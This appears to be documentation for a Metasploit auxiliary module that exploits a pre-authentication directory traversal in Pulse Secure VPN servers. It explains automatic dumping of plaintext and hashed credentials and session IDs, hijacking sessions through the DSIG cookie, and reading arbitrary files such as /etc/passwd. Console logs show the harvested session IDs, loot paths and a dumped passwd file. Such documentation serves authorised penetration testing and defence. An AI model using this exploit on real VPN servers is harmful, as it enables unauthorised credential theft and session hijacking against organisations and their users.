## Introduction

This module exploits a pre-auth directory traversal in the Pulse Secure
VPN server to dump an arbitrary file. Dumped files are stored in loot.

If the `Automatic` action is set, plaintext and hashed credentials, as
well as session IDs, will be dumped. Valid sessions can be hijacked by
setting the `DSIG` browser cookie to a valid session ID.

For the `Manual` action, please specify a file to dump via the `FILE`
option. `/etc/passwd` will be dumped by default. If the `PRINT` option is
set, file contents will be printed to the screen, with any unprintable
characters replaced by a period.

Please see related module exploit/linux/http/pulse_secure_cmd_exec to
see what you can do with a valid session or credentials.

## Actions

```
Name       Description
----       -----------
Automatic  Dump creds and sessions
Manual     Dump an arbitrary file (FILE option)
```

## Options

**FILE**

Set this to the file you want to dump. The default is `/etc/passwd`.
Valid only in manual mode.

**PRINT**

Whether to print file contents to the screen. Valid only in manual mode.

## Usage

Dumping creds and sessions in automatic mode:

```
msf5 auxiliary(gather/pulse_secure_file_disclosure) > run
[*] Running module against [redacted]

[*] Running in automatic mode
[*] Dumping /data/runtime/mtmp/lmdb/dataa/data.mdb
[+] /Users/wvu/.msf4/loot/20191029221840_default_[redacted]_PulseSecureVPN_273470.mdb
[*] Dumping /data/runtime/mtmp/lmdb/randomVal/data.mdb
[*] Parsing session IDs...
[+] Session ID found: df502e6052d9002d8f02160af8bfd055
[+] Session ID found: 249b470bd9bd1983f721ca950a74e61c
[+] Session ID found: acbef5625
[+] Session ID found: c145e683a
[+] Session ID found: fc6c097dd
[+] Session ID found: 249b470bd9bd1983f721ca950a74e61c
[+] Session ID found: c145e683a17cfacb72a47eb8b2515c14
[+] Session ID found: a7661751393e16fa253e97bd02dc2a4f
[+] Session ID found: 7e78ab276afea3f00dfa41892c437156c699eff8
[+] /Users/wvu/.msf4/loot/20191029221845_default_[redacted]_PulseSecureVPN_607925.mdb
[*] Dumping /data/runtime/mtmp/system
[+] /Users/wvu/.msf4/loot/20191029221851_default_[redacted]_PulseSecureVPN_530345.bin
[*] Auxiliary module execution completed
msf5 auxiliary(gather/pulse_secure_file_disclosure) > loot

Loot
====

host         service  type                                        name                                        content                   info                   path
----         -------  ----                                        ----                                        -------                   ----                   ----
[redacted]            Pulse Secure VPN Arbitrary File Disclosure  /data/runtime/mtmp/lmdb/dataa/data.mdb      application/octet-stream  Plaintext credentials  /Users/wvu/.msf4/loot/20191029221840_default_[redacted]_PulseSecureVPN_273470.mdb
[redacted]            Pulse Secure VPN Arbitrary File Disclosure  /data/runtime/mtmp/lmdb/randomVal/data.mdb  application/octet-stream  Session IDs            /Users/wvu/.msf4/loot/20191029221845_default_[redacted]_PulseSecureVPN_607925.mdb
[redacted]            Pulse Secure VPN Arbitrary File Disclosure  /data/runtime/mtmp/system                   application/octet-stream  Hashed credentials     /Users/wvu/.msf4/loot/20191029221851_default_[redacted]_PulseSecureVPN_530345.bin

msf5 auxiliary(gather/pulse_secure_file_disclosure) >
```

Dumping default `/etc/passwd` in manual mode:

```
msf5 auxiliary(gather/pulse_secure_file_disclosure) > set action Manual
action => Manual
msf5 auxiliary(gather/pulse_secure_file_disclosure) > run
[*] Running module against [redacted]

[*] Running in manual mode
[*] Dumping /etc/passwd
root:x:0:0:root:/:/bin/bash
nfast:x:0:0:nfast:/:/bin/bash
bin:x:1:1:bin:/:
nobody:x:99:99:Nobody:/:
dns:x:98:98:DNS:/:
term:x:97:97:Telnet/SSH:/:
web80:x:96:96:Port 80 web:/:
rpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin
postgres:x:102:102:PostgreSQL User:/:

[+] /Users/wvu/.msf4/loot/20191029222949_default_[redacted]_PulseSecureVPN_073170.bin
[*] Auxiliary module execution completed
msf5 auxiliary(gather/pulse_secure_file_disclosure) >
```
